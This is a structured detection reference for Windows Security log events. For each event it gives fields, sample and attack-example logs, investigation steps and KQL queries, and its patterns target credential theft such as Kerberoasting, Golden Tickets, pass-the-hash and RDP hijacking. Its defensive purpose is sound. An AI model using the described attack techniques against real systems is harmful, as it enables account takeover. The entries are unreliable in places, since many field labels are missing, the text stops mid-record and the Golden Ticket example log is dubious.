scope: Security log (40 events) + PowerShell operational log (4 events) + Sysmon (29 events).
note: Sample logs and attack examples use the real Windows Security auditing field templates (verified against the field-by-field encyclopedia at ultimatewindowssecurity.com), with fictional CORP domain values and RFC 5737 documentation-range IPs (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) for anything external or attacker-controlled.

events.name: An account was successfully logged on
events.description: Logged whenever an account successfully authenticates and establishes a logon session, whether interactively at the console, over the network, as a service, or via RDP. The Logon Type field says how.

key_fields.meaning: Numeric code for how the logon occurred: 2=Interactive, 3=Network, 4=Batch, 5=Service, 7=Unlock, 8=NetworkCleartext, 9=NewCredentials, 10=RemoteInteractive (RDP), 11=CachedInteractive.

key_fields.field: New Logon > Security ID / Account Name / Account Domain
key_fields.meaning: The account that logged on, its SID (stable across renames), and the domain or local machine it belongs to.
A per-session hex identifier that ties every later event from this exact session together.

key_fields.field: Network Information > Source Network Address / Source Port
key_fields.meaning: The IP address and client-side TCP port the logon originated from.
Full path of the process that performed the logon, such as winlogon.exe.
Kerberos or NTLM, whichever protocol actually validated the credentials.

events.normal_baseline: Frequent and expected: interactive logons at shift start (Type 2), RPC/service logons (Type 5), network logons to file shares (Type 3), unlock events (Type 7).

anomalies: Logon Type 3 (network) or Type 10 (RemoteInteractive) from an unfamiliar source IP or at an unusual hour
Logon Type 9 (NewCredentials, used by RunAs /netonly) on a workstation that shouldn't need it
A service account authenticating interactively (Type 2) instead of its normal batch/service logon
High volume of 4624 events immediately following a burst of 4625 failures, suggesting a successful brute-force or password spray

attack_example.scenario: A brute-forced account finally authenticates: Type 10 (RDP) at 03:14 local time from an external IP that has never logged on before, immediately following dozens of 4625 failures for the same account.

investigation_steps: Pivot on the Logon ID to pull every other event tied to this exact session (4634 logoff, 4672 privilege assignment, 4688 process creations) and reconstruct what the session actually did.
Check Logon Type against the account's normal pattern: a service account should not show Type 2/10, a human account should rarely show Type 5.
Resolve Source Network Address against known corporate ranges, VPN pools, and prior logons for this account; flag anything new or geographically inconsistent.
false_positives: VPN or proxy re-authentication after a dropped connection, producing a new Logon ID for a session the user never noticed break
Scheduled tasks or monitoring agents that authenticate on a fixed interval and look identical to an interactive logon
events.detection_query:
let Successes = SecurityEvent
| where EventID == 4624 and LogonType in (3,10)
| project SuccessTime=TimeGenerated, TargetAccount, IpAddress;
let Failures = SecurityEvent
| where EventID == 4625
| summarize FailCount=count() by TargetAccount, IpAddress, bin(TimeGenerated, 15m);
Failures
| where FailCount > 10
| join kind=inner Successes on TargetAccount, IpAddress
| where SuccessTime > TimeGenerated
related_attacks: Password spray or brute-force campaigns, confirming a successful login after a burst of failures
Insider threat investigations, establishing who was logged on and from where
Business Email Compromise follow-on access from an unusual location

events.name: An account failed to log on
events.description: Logged when a logon attempt fails, before a session is established. The Failure Reason and Status/Sub Status codes identify why (bad password, disabled account, account locked, time restriction, etc.).

key_fields.field: Account For Which Logon Failed > Account Name / Account Domain
key_fields.meaning: The account the attempt was made against.
How the logon was attempted (same numeric codes as 4624).
A human-readable summary of why the logon failed.
The precise Windows NTSTATUS codes, e.g. 0xC000006A (bad password), 0xC0000234 (account locked), 0xC0000064 (no such account).

key_fields.field: Network Information > Source Network Address / Source Port
key_fields.meaning: Where the failed attempt came from.
The process on the source that attempted the logon.

events.normal_baseline: Occasional single failures from mistyped passwords or expired credentials cached on a device.
events.sample_log:

	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Type:			3

	Security ID:		S-1-0-0
	Account Name:		jsmith
	Account Domain:		CORP

Failure Information:
	Failure Reason:		Unknown user name or bad password.
	Status:			0xC000006D
	Sub Status:		0xC000006A

	Caller Process ID:	0x0
	Caller Process Name:	-

	Workstation Name:	WKS-FIN07

	Source Port:		51330

Detailed Authentication Information:
	Logon Process:		NtLmSsp
	Authentication Package:	NTLM

	Package Name (NTLM only):	-

anomalies: High-volume 4625 events against a single account from one source in a short window (password guessing)
4625 events against many different accounts from one source (password spraying)
Failures with Sub Status 0xC0000064 (account does not exist) at scale, indicating account enumeration

attack_example.scenario: A password-spray tool cycles through dozens of accounts from one external IP, one guess per account to stay under per-account lockout thresholds.
attack_example.log:
An account failed to log on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Type:			3

Account For Which Logon Failed:
	Security ID:		S-1-0-0
	Account Name:		k.patel
	Account Domain:		CORP

Failure Information:
	Failure Reason:		Unknown user name or bad password.
	Status:			0xC000006D
	Sub Status:		0xC000006A

Process Information:
	Caller Process ID:	0x0
	Caller Process Name:	-

Network Information:
	Workstation Name:	-
	Source Network Address:	198.51.100.23
	Source Port:		44190

Detailed Authentication Information:
	Logon Process:		NtLmSsp
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

[repeated for m.reyes, t.nguyen, a.okafor, ... from the same source within 60 seconds]

investigation_steps: Group failures by Source Network Address and by Account Name over a short rolling window to distinguish a single locked-out user from spraying or brute-force against many accounts.
Check the Sub Status code specifically: 0xC000006A implies guessing, 0xC0000234 implies the attack already crossed the lockout threshold, 0xC0000064 implies enumeration.
If failures stop and a 4624 for the same account appears shortly after from the same or a related source, treat the prior failures as reconnaissance for a now-successful compromise.
false_positives: A user who changed their password on one device but not others, causing repeated failures from cached credentials on phones or mapped drives
An expired or locked service account used by multiple scheduled jobs, producing synchronized failures at the job's run time
events.detection_query:
SecurityEvent
| where EventID == 4625
| summarize FailCount=count(), Accounts=make_set(TargetAccount) by IpAddress, bin(TimeGenerated, 10m)
| where FailCount > 10 or array_length(Accounts) > 5
related_attacks: Password spraying campaigns across many accounts
Credential stuffing using leaked credential dumps
Account enumeration reconnaissance ahead of a targeted attack

events.name: An account was logged off
events.description: Logged when a logon session ends. Pairs with the 4624 (or equivalent) event that opened the same Logon ID, letting an analyst compute session duration.

key_fields.meaning: The account whose session ended.
The logon type of the session that just closed.
Matches the Logon ID from the session's original 4624, used to bound its duration.

events.normal_baseline: Expected at end of interactive sessions, RDP disconnects, and short-lived service or network logon sessions closing.
events.sample_log:
An account was logged off.

Subject:
	Security ID:		S-1-5-21-3623811015-3361044348-30300820-1104
	Account Name:		jsmith
	Account Domain:		CORP
	Logon ID:		0x3F2A891
	Logon Type:		2
anomalies: A 4634 with no matching prior 4624 for the same Logon ID (log gap or tampering)
Abnormally long-lived sessions for logon types that are normally short-lived, such as network logons

attack_example.scenario: A Logon ID closes with a 4634 but no corresponding 4624 exists earlier in the retained log, consistent with a partial log-clearing event (1102) that removed the opening record.
attack_example.log:
An account was logged off.

Subject:
	Security ID:		S-1-5-21-3623811015-3361044348-30300820-2201
	Account Name:		svc_backup
	Account Domain:		CORP
	Logon ID:		0x9A11C40
	Logon Type:		10

[no matching 4624 for Logon ID 0x9A11C40 found earlier in the retained log]

investigation_steps: Use the Logon ID to close out the session timeline started by the matching 4624, and confirm no further 4688 or 4663 events exist for that Logon ID after this point.
If investigating a suspected compromised session, note the logoff time as the latest boundary for what needs to be reviewed.
false_positives: Routine session end at shift change or workstation lock/unlock cycling
Short-lived logon types that log on and off within the same second as part of normal resource access
related_attacks: Session-duration reconstruction in any authentication-based investigation
Confirming attacker dwell time within a single logon session

events.name: A logon was attempted using explicit credentials
events.description: Logged when a process explicitly supplies alternate credentials to authenticate, rather than using the token of the calling user, most commonly via RunAs, scheduled tasks running as another user, or applications that prompt for credentials.

key_fields.meaning: The account that ran the action (the one already logged on).

key_fields.field: Account Whose Credentials Were Used > Account Name
key_fields.meaning: The alternate account whose credentials were supplied.
The remote system the alternate credentials were used against, if any.
The process that supplied the alternate credentials, e.g. runas.exe.
The destination address, if the credentials were used remotely.

events.normal_baseline: Admins using RunAs to elevate for a specific task, service accounts starting scheduled jobs, applications like SQL Server Management Studio connecting with SQL auth.
events.sample_log:
A logon was attempted using explicit credentials.

Subject:
	Security ID:		S-1-5-21-3623811015-3361044348-30300820-1104
	Account Name:		jsmith
	Account Domain:		CORP
	Logon ID:		0x3F2A891
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Account Whose Credentials Were Used:
	Account Name:		svc_sql
	Account Domain:		CORP
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Target Server:
	Target Server Name:	SRV-SQL02.corp.local
	Additional Information:	SRV-SQL02.corp.local

Process Information:
	Process ID:		0x1f4c
	Process Name:		C:\Program Files\Microsoft SQL Server Management Studio\ssms.exe

Network Information:
	Network Address:	-
	Port:			-
anomalies: A standard user account generating 4648 events, which can indicate credential harvesting or lateral movement tooling
4648 immediately preceding lateral movement events (4624 Type 3 or 10 on a remote host) using the same credentials
Explicit-credential logons from unexpected processes, such as a browser or Office app

attack_example.scenario: A compromised workstation uses harvested domain-admin credentials to authenticate to a remote server, immediately followed by a 4624 Type 3 on that server, the classic lateral-movement pivot.
attack_example.log:
A logon was attempted using explicit credentials.

Subject:
	Security ID:		S-1-5-18
	Account Name:		WKS-FIN07$
	Account Domain:		CORP
	Logon ID:		0x3E7
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Account Whose Credentials Were Used:
	Account Name:		da_jdoe
	Account Domain:		CORP
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Target Server:
	Target Server Name:	DC01.corp.local
	Additional Information:	DC01.corp.local

Process Information:
	Process ID:		0x2f88
	Process Name:		C:\Users\jsmith\AppData\Local\Temp\update.exe

Network Information:
	Network Address:	10.20.1.10
	Port:			445

investigation_steps: Identify the Process Name that initiated the explicit-credential logon; a standard user's browser or Office app doing this is far more suspicious than mstsc.exe or a known admin tool.
Check Target Server Name and Network Address to see where the alternate credentials were used, then pivot to that host's own 4624 to confirm whether the logon actually succeeded there.
Compare the Subject (who ran the action) against the Account Whose Credentials Were Used; a mismatch outside documented admin workflows warrants a call to the account owner.
false_positives: Legitimate RunAs usage by IT or helpdesk staff for elevated maintenance tasks
Applications such as SSMS or mapped-drive credentials configured to store and reuse alternate credentials by design
events.detection_query:
SecurityEvent
| where EventID == 4648
| summarize Count=count(), TargetServers=make_set(TargetServerName) by SubjectUserName, ProcessName, bin(TimeGenerated, 1h)
| where Count > 3
related_attacks: Lateral movement using stolen credentials via RunAs or explicit-credential pivoting
Pass-the-hash and overpass-the-hash campaigns
Credential harvesting via malicious tooling such as Mimikatz

events.name: Special privileges assigned to new logon
events.description: Logged immediately after a 4624 when the new logon session is granted one or more sensitive privileges, such as SeDebugPrivilege, SeBackupPrivilege, or SeTcbPrivilege, effectively flagging an administrative or highly privileged logon.

key_fields.meaning: The account whose new session received elevated privileges.
The specific sensitive rights granted, such as SeDebugPrivilege (attach to any process) or SeBackupPrivilege (read any file bypassing ACLs).
Matches the Logon ID of the 4624 this event immediately follows.

events.normal_baseline: Expected for domain admins, local administrators, and system or service accounts logging on to perform admin tasks.
events.sample_log:
Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-21-3623811015-3361044348-30300820-500
	Account Name:		jdoe.admin
	Account Domain:		CORP
	Logon ID:		0x4B7C102

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
anomalies: 4672 for an account not normally in a privileged group, which can indicate privilege escalation or group membership tampering
4672 at an unusual time or from an unusual source, paired with the same Logon ID as a suspicious 4624

attack_example.scenario: A standard help-desk account, silently added to Domain Admins minutes earlier, logs on and receives SeDebugPrivilege, enabling process-memory access used for credential dumping.
attack_example.log:
Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-21-3623811015-3361044348-30300820-3310
	Account Name:		helpdesk_t2
	Account Domain:		CORP
	Logon ID:		0x9A11D02

Privileges:		SeDebugPrivilege
			SeTcbPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege

investigation_steps: Match the Logon ID back to its 4624 to see exactly how the privileged session was established and from where.
Check the account's recent group-membership changes (4732/4728) to confirm the privilege assignment matches an expected, documented role.
If the account is not a designated administrator, treat this as a priority escalation regardless of what else the session did.
false_positives: Standard behavior for IT staff, backup services, and monitoring agents that legitimately hold sensitive privileges
Built-in SYSTEM and service logons that always carry elevated privileges as part of normal OS operation
events.detection_query:
SecurityEvent
| where EventID == 4672
| where TargetUserName !in (KnownPrivilegedAccounts)  // maintain as a watchlist
related_attacks: Privilege escalation confirmation
Golden or Silver Ticket abuse, where an elevated session is established from a forged ticket
Insider privilege abuse investigations

events.name: A Kerberos authentication ticket (TGT) was requested
events.description: Logged on a domain controller when a client requests a Ticket Granting Ticket, the first step of Kerberos authentication. Encryption type and pre-authentication fields are key for spotting weak-crypto or ticket-forging abuse.

key_fields.field: Account Information > Account Name / Supplied Realm Name
key_fields.meaning: The account requesting the TGT and the Kerberos realm (AD domain) it was requested from.
The IP address the request came from.
The cipher used, e.g. 0x12 = AES256 (strong) vs 0x17 = RC4 (weak, a forgery red flag if AES is supported).
The method used to prove the request is fresh; type 2 is standard encrypted-timestamp pre-auth.
0x0 for success; nonzero values indicate the specific failure reason.

events.normal_baseline: Routine TGT requests at logon and TGT renewal roughly every 10 hours (default Kerberos ticket lifetime) for every domain user and computer account.
events.sample_log:
A Kerberos authentication ticket (TGT) was requested.

Account Information:
	Account Name:		jsmith
	Supplied Realm Name:	CORP.LOCAL
	User ID:		S-1-5-21-3623811015-3361044348-30300820-1104

Service Information:
	Service Name:		krbtgt
	Service ID:		S-1-5-21-3623811015-3361044348-30300820-502

Network Information:
	Client Address:		::ffff:10.20.4.51
	Client Port:		49221

Additional Information:
	Ticket Options:		0x40810010
	Result Code:		0x0
	Ticket Encryption Type:	0x12
	Pre-Authentication Type:	2
anomalies: Ticket Encryption Type 0x17 (RC4) where AES is expected, a common Golden or Silver Ticket forgery indicator
TGT requests for a machine account from an unexpected source
A spike in 4768 failures indicating brute-force or AS-REP roasting attempts against accounts with pre-authentication disabled

attack_example.scenario: A Golden Ticket is forged offline using the domain krbtgt hash, then presented to a domain controller; the ticket uses RC4 encryption even though the domain is AES-only.
attack_example.log:
A Kerberos authentication ticket (TGT) was requested.

Account Information:
	Account Name:		krbtgt
	Supplied Realm Name:	CORP.LOCAL
	User ID:		S-1-5-21-3623811015-3361044348-30300820-502

Service Information:
	Service Name:		krbtgt
	Service ID:		S-1-5-21-3623811015-3361044348-30300820-502

Network Information:
	Client Address:		::ffff:10.20.4.51
	Client Port:		51002

Additional Information:
	Ticket Options:		0x40810010
	Result Code:		0x0
	Ticket Encryption Type:	0x17
	Pre-Authentication Type:	0

investigation_steps: Check Ticket Encryption Type first; RC4 (0x17) where the environment supports AES is worth a closer look on its own.
Correlate Client Address with the account's normal workstation; a TGT request for a user account originating from a server segment is unusual.
If Golden Ticket abuse is suspected, compare ticket lifetime and originating KDC against expected values, and check for TGT requests with no preceding interactive logon.
false_positives: Normal 10-hour TGT renewal cycles for every active domain session, which can look like a burst around the start of the business day
Legacy applications or older OS versions that request RC4 by configuration rather than by attack
events.detection_query:
SecurityEvent
| where EventID == 4768
| where TicketEncryptionType == "0x17"
related_attacks: Golden Ticket attacks using a forged TGT
AS-REP Roasting against accounts with pre-authentication disabled
Domain Controller compromise investigations

events.name: A Kerberos service ticket was requested
events.description: Logged on a domain controller when a client requests a Ticket Granting Service ticket to access a specific service identified by its Service Principal Name, the step that lets an authenticated user actually connect to a resource.

key_fields.meaning: The account requesting access to the service.

key_fields.field: Service Information > Service Name / Service ID
key_fields.meaning: The SPN and account backing the target service, e.g. MSSQLSvc/srv-sql02.corp.local:1433.
The IP address the request came from.
0x12 = AES256 (strong); 0x17 = RC4 (weak, cheap to crack offline, the value Kerberoasting tooling targets).
0x0 for success; nonzero indicates why the ticket request failed.

events.normal_baseline: High-volume, routine event: every access to a network resource registered with an SPN generates one.
events.sample_log:
A Kerberos service ticket was requested.

Account Information:
	Account Name:		jsmith@CORP.LOCAL
	Account Domain:		CORP.LOCAL
	Logon GUID:		{3432a23c-bb03-007e-e951-eeacdf5b5606}

Service Information:
	Service Name:		svc_sql
	Service ID:		CORP\svc_sql

Network Information:
	Client Address:		::ffff:10.20.4.51
	Client Port:		49230

Additional Information:
	Ticket Options:		0x40810000
	Ticket Encryption Type:	0x12
	Failure Code:		0x0
	Transited Services:	-
anomalies: A burst of 4769 requests for many different service accounts' SPNs from a single user session in a short window, the signature of Kerberoasting
Ticket Encryption Type 0x17 (RC4) requested for a service that supports AES, since RC4 tickets are far cheaper to crack offline
Requests for high-value SPNs, such as MSSQLSvc, from accounts that never normally touch that service

attack_example.scenario: A Kerberoasting tool enumerates every SPN in the domain and requests a service ticket for each, forcing RC4 encryption to make offline password cracking of the service accounts feasible.
attack_example.log:
A Kerberos service ticket was requested.

Account Information:
	Account Name:		jsmith@CORP.LOCAL
	Account Domain:		CORP.LOCAL
	Logon GUID:		{3432a23c-bb03-007e-e951-eeacdf5b5606}

Service Information:
	Service Name:		svc_sql
	Service ID:		CORP\svc_sql

Network Information:
	Client Address:		::ffff:10.20.4.51
	Client Port:		49230

Additional Information:
	Ticket Options:		0x40810000
	Ticket Encryption Type:	0x17
	Failure Code:		0x0
	Transited Services:	-

[followed within seconds by identical requests for svc_web, svc_fs, svc_sql05, ... each forcing RC4]

investigation_steps: Count distinct Service Names requested by the same account or session in a short window; more than a handful of different SPNs in seconds to minutes is the core Kerberoasting signature.
Check Ticket Encryption Type for RC4 requests against AES-capable services.
If a wave of 4769 events is followed by a 4624 or 4648 using a service account's credentials, treat the earlier burst as attacker reconnaissance.
false_positives: A user or application legitimately touching many different services in normal use, such as a jump host or a monitoring tool
Normal ticket renewal traffic during a busy period, especially right after a mass restart
events.detection_query:
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17" and ServiceName != "krbtgt"
| summarize DistinctSPNs = dcount(ServiceName) by TargetUserName, bin(TimeGenerated, 10m)
| where DistinctSPNs > 5
related_attacks: Kerberoasting campaigns against service accounts
Silver Ticket abuse using a forged service ticket
Service account credential theft

events.name: Kerberos pre-authentication failed
events.description: Logged on a domain controller when a client's Kerberos pre-authentication fails, most commonly a bad password, but the Failure Code distinguishes this from other causes like clock skew or disabled accounts.

key_fields.field: Account Information > Security ID / Account Name
key_fields.meaning: The account the failed request was made against.
The IP address the request came from.
0x18 = bad password, 0x25 = clock skew, 0x12 = account disabled/expired/locked.
The pre-auth method that failed; helps distinguish a real password guess from a protocol-level mismatch.

events.normal_baseline: Occasional isolated failures from user typos or stale cached credentials.
events.sample_log:
Kerberos pre-authentication failed.

Account Information:
	Security ID:		CORP\jsmith
	Account Name:		jsmith
	Supplied Realm Name:	CORP.LOCAL
	User ID:		CORP\jsmith

Service Information:
	Service Name:		krbtgt/CORP.LOCAL

Network Information:
	Client Address:		::ffff:10.20.4.51
	Client Port:		50123

Additional Information:
	Ticket Options:		0x40810010
	Failure Code:		0x18
	Pre-Authentication Type:	2
anomalies: Repeated 4771 failures against one or many accounts from a single source in a short window, indicating brute force or password spraying
Failure Code 0x18 (bad password) at volume against privileged or service accounts

attack_example.scenario: A spray tool tries one password against dozens of accounts, most producing 0x18 bad-password failures, all from the same external-facing jump box in a tight time window.
attack_example.log:
Kerberos pre-authentication failed.

Account Information:
	Security ID:		CORP\r.diaz
	Account Name:		r.diaz
	Supplied Realm Name:	CORP.LOCAL
	User ID:		CORP\r.diaz

Service Information:
	Service Name:		krbtgt/CORP.LOCAL

Network Information:
	Client Address:		::ffff:198.51.100.23
	Client Port:		50931

Additional Information:
	Ticket Options:		0x40810010
	Failure Code:		0x18
	Pre-Authentication Type:	2

[repeated for l.chen, m.okafor, s.hassan, ... within the same 90-second window]

investigation_steps: Check Failure Code: 0x18 is bad password, 0x25 is clock skew (usually not an attack), 0x12 is a disabled or expired account being targeted.
Aggregate by Client Address across many target accounts to catch password spraying that individual per-account thresholds would miss.
Cross-reference with 4625 events for the same account to see whether the same activity also shows up as NTLM or interactive failures.
false_positives: Users re-typing a recently changed password across multiple Kerberos-aware applications before the new one propagates
Expired passwords on service accounts causing repeated automated retry attempts
events.detection_query:
SecurityEvent
| where EventID == 4771
| summarize FailCount=count(), Accounts=dcount(TargetUserName) by IpAddress, bin(TimeGenerated, 10m)
| where FailCount > 10 or Accounts > 5
related_attacks: Password spraying against Kerberos-enabled accounts
AS-REP Roasting reconnaissance

events.name: The domain controller attempted to validate the credentials for an account
events.description: Logged when NTLM is used to validate credentials, either because Kerberos wasn't available or requested, or the target explicitly required NTLM. The Error Code field distinguishes success from specific failure reasons.

key_fields.meaning: The account whose credentials were validated.
The NetBIOS name of the machine that initiated the NTLM request.
0x0 for success; nonzero codes such as 0xC0000064 (no such user) or 0xC000006A (bad password) mirror the 4625 status codes.

events.normal_baseline: Expected for legacy applications, local logons, and access to resources by IP address, which forces NTLM instead of Kerberos.
events.sample_log:
The computer attempted to validate the credentials for an account.

Authentication Package:	MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
Logon Account:		jsmith
Source Workstation:	WKS-FIN07
Error Code:		0x0
anomalies: Unexpected volume of NTLM authentication on a network that should be Kerberos-only, which can indicate a downgrade or relay attempt
Repeated 4776 failures against one account from one workstation in a short window, indicating brute force
Error Code 0xC0000064 (account does not exist) at scale, indicating account enumeration

attack_example.scenario: An NTLM relay attack forces a victim server to authenticate to an attacker-controlled listener, which forwards the NTLM challenge/response to a domain controller for validation on the attacker's behalf.
attack_example.log:
The computer attempted to validate the credentials for an account.

Authentication Package:	MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
Logon Account:		SRV-FILE03$
Source Workstation:	WKS-FIN07
Error Code:		0x0

[unexpected: SRV-FILE03$ machine-account NTLM validation initiated from a workstation, not from SRV-FILE03 itself]

investigation_steps: Confirm why NTLM was used at all in an environment that should default to Kerberos; check Source Workstation and whether the target was accessed by IP address.
On repeated failures, check whether the same workstation is also generating 4625 or 4771 events for other accounts.
If NTLM relay is suspected, check whether the validating DC and the workstation sit on network segments that shouldn't normally relay authentication to each other.
false_positives: Legacy line-of-business applications hardcoded to use NTLM
Access to a resource by raw IP address rather than hostname, which forces NTLM even on a fully Kerberos-capable network
events.detection_query:
SecurityEvent
| where EventID == 4776 and Status != "0x0"
| summarize FailCount=count() by TargetAccount, Workstation, bin(TimeGenerated, 10m)
| where FailCount > 10
related_attacks: NTLM relay attacks
Pass-the-hash campaigns
Legacy-protocol downgrade attacks

events.name: A session was reconnected to a Window Station
events.description: Logged when a disconnected RDP session is reconnected, either from the same client or a different one. Session ID and client name let an analyst track a session across disconnect and reconnect cycles.

key_fields.meaning: The account whose session was reconnected.
The RDP session identifier, e.g. RDP-Tcp#3.

key_fields.field: Additional Information > Client Name / Client Address
key_fields.meaning: The friendly name and IP address of the device reconnecting to the session.

events.normal_baseline: Normal for users reconnecting to a persistent RDP session after a network drop or intentionally disconnecting.
events.sample_log:
A session was reconnected to a Window Station.

Subject:
	Account Name:		jsmith
	Account Domain:		CORP
	Logon ID:		0x3F2A891

Session:
	Session Name:		RDP-Tcp#3

Additional Information:
	Client Name:		WKS-JSMITH-LT
	Client Address:	10.20.4.51
anomalies: A session reconnecting from a Client Address that differs from the one that originally created it, which can indicate session hijacking
Reconnects at unusual hours for an account that normally works fixed shifts

attack_example.scenario: An attacker with local admin rights hijacks a disconnected privileged RDP session using session-ID manipulation, reconnecting from a different host than the one that originally started the session.
attack_example.log:
A session was reconnected to a Window Station.

Subject:
	Account Name:		jdoe.admin
	Account Domain:		CORP
	Logon ID:		0x4B7C102

Session:
	Session Name:		RDP-Tcp#7

Additional Information:
	Client Name:		SRV-JUMP02
	Client Address:	10.20.9.15

[original 4779 disconnect for this session recorded Client Address 10.20.4.51, a different host]

investigation_steps: Compare the reconnecting Client Address against the address that produced the original 4624 or the prior 4779 disconnect for the same session.
Check the time gap between disconnect (4779) and reconnect; an unusually long gap followed by activity from a new location deserves a call to the legitimate user.
Pull 4688 events for the reconnected session to see what happened immediately after reconnect.
false_positives: A user reconnecting from a second device under a roaming profile or thin-client setup
Unstable VPN or network dropping and re-establishing the RDP session automatically from the same physical location
events.detection_query:
SecurityEvent
| where EventID == 4778
| join kind=inner (
    SecurityEvent | where EventID == 4624 | project OrigIp=IpAddress, TargetLogonId
) on TargetLogonId
| where IpAddress != OrigIp
related_attacks: RDP session hijacking
Living-off-the-land lateral movement via RDP

events.name: A session was disconnected from a Window Station
events.description: Logged when an RDP session is disconnected without fully logging off, leaving the session running in the background so it can later be reconnected via a 4778 event.

key_fields.meaning: The account whose session was disconnected.
The RDP session identifier.

key_fields.field: Additional Information > Client Name / Client Address
key_fields.meaning: The device that was connected before the disconnect.

events.normal_baseline: Normal whenever a user closes an RDP client or the connection drops without explicitly logging off.
events.sample_log:
A session was disconnected from a Window Station.

Subject:
	Account Name:		jsmith
	Account Domain:		CORP
	Logon ID:		0x3F2A891

Session:
	Session Name:		RDP-Tcp#3

Additional Information:
	Client Name:		WKS-JSMITH-LT
	Client Address:	10.20.4.51
anomalies: Disconnects immediately followed by a reconnect (4778) from a different Client Address
A pattern of disconnect and reconnect cycling used to keep a session alive while evading logoff-triggered controls

attack_example.scenario: A privileged session is deliberately kept alive through repeated disconnect/reconnect cycles rather than a clean logoff, avoiding logoff-triggered session-cleanup or alerting.
attack_example.log:
A session was disconnected from a Window Station.

Subject:
	Account Name:		jdoe.admin
	Account Domain:		CORP
	Logon ID:		0x4B7C102

Session:
	Session Name:		RDP-Tcp#7

Additional Information:
	Client Name:		WKS-JSMITH-LT
	Client Address:	10.20.4.51

[disconnect/reconnect pair repeats every few minutes over several hours instead of one clean logoff]

investigation_steps: Treat this as a bookmark: pair it with the following 4778, if any, to detect a source-address change, and with 4634 if the session fully logs off instead.
A disconnect with no subsequent reconnect or logoff for an extended period can indicate a session left open and abandoned.
false_positives: Normal RDP client closure without an explicit logoff, the default behavior for most RDP clients
Idle-timeout disconnects configured by group policy
events.detection_query:
SecurityEvent
| where EventID == 4779
| summarize DisconnectCount = count() by TargetAccount, bin(TimeGenerated, 1h)
| where DisconnectCount > 10
related_attacks: RDP session hijacking, paired with a later 4778
Persistence via disconnected background sessions

events.name: A replay attack was detected
events.description: Logged when Kerberos detects that an authentication request was received twice with identical information, the signature of a replay attack (or, far more commonly, a network misconfiguration that duplicates packets).

key_fields.meaning: The account the local system was operating as when it detected the replay.

key_fields.field: Credentials Which Were Replayed > Account Name / Account Domain
key_fields.meaning: The identity whose authentication material was seen twice.

key_fields.field: Detailed Authentication Information > Request Type / Logon Process / Authentication Package
key_fields.meaning: The Kerberos request type and the components that processed it.

events.normal_baseline: Extremely rare in a healthy network; this event has almost no legitimate high-volume baseline.
events.sample_log:
A replay attack was detected.

Subject:
	Security ID:		S-1-5-18
	Account Name:		DC01$
	Account Domain:		CORP
	Logon ID:		0x3E7

Credentials Which Were Replayed:
	Account Name:		jsmith
	Account Domain:		CORP.LOCAL

Process Information:
	Process ID:		0x268
	Process Name:		C:\Windows\System32\lsass.exe

Network Information:
	Workstation Name:	WKS-FIN07

Detailed Authentication Information:
	Request Type:		AS Request
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
anomalies: Any occurrence at all, given how rare legitimate causes are, warrants a look
Repeated replay detections for the same account rather than a single isolated network glitch

attack_example.scenario: An attacker captures a valid Kerberos authenticator off the wire and replays it to impersonate the original client; the domain controller's replay cache catches the duplicate.
attack_example.log:
A replay attack was detected.

Subject:
	Security ID:		S-1-5-18
	Account Name:		DC01$
	Account Domain:		CORP
	Logon ID:		0x3E7

Credentials Which Were Replayed:
	Account Name:		jdoe.admin
	Account Domain:		CORP.LOCAL

Process Information:
	Process ID:		0x268
	Process Name:		C:\Windows\System32\lsass.exe

Network Information:
	Workstation Name:	-

Detailed Authentication Information:
	Request Type:		AP Request
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-

investigation_steps: Rule out network-level packet duplication (misconfigured switches, aggressive retransmission) as the far more common benign cause before assuming an attack.
If the account replayed is privileged, or the event recurs, correlate with 4768/4769 activity for the same account around the same timestamp.
Check whether the workstation involved has any signs of network sniffing tools or ARP spoofing on its segment.
false_positives: Network misconfiguration causing duplicate packet delivery, by far the most common cause in practice
Clustered or load-balanced authentication proxies that can inadvertently resubmit the same request
related_attacks: Kerberos ticket replay as part of a network-based credential theft attack

events.name: Special groups have been assigned to a new logon
events.description: Logged when a logon session includes membership in one of the administrator-designated "Special Groups" watch list, a lighter-weight alternative to 4672 for flagging sensitive-group logons once Special Groups auditing is configured.

key_fields.field: New Logon > Account Name / Account Domain
key_fields.meaning: The account whose new session included a watched special group.
Which of the configured watch-list groups the account belongs to.
Ties this event back to the corresponding 4624.

events.normal_baseline: Expected whenever a member of a configured watch-list group (commonly Domain Admins or a custom tier-0 group) logs on.
events.sample_log:
Special groups have been assigned to a new logon.

Subject:
	Security ID:		SYSTEM
	Account Name:		DC01$
	Account Domain:		CORP
	Logon ID:		0x3E7
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

New Logon:
	Security ID:		CORP\jdoe.admin
	Account Name:		jdoe.admin
	Account Domain:		CORP
	Logon ID:		0x4B7C102
	Logon GUID:		{3432a23c-bb03-007e-e951-eeacdf5b5606}
	Special Groups Assigned:	CORP\Domain Admins
anomalies: A special-group logon for an account not expected to hold tier-0 access
A special-group logon at an unusual time or from an unusual source

attack_example.scenario: A backdoor account recently added to Domain Admins logs on for the first time; the special-groups watch list flags the sensitive membership on the very first session.
attack_example.log:
Special groups have been assigned to a new logon.

Subject:
	Security ID:		SYSTEM
	Account Name:		DC01$
	Account Domain:		CORP
	Logon ID:		0x3E7
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

New Logon:
	Security ID:		CORP\svc_helper02
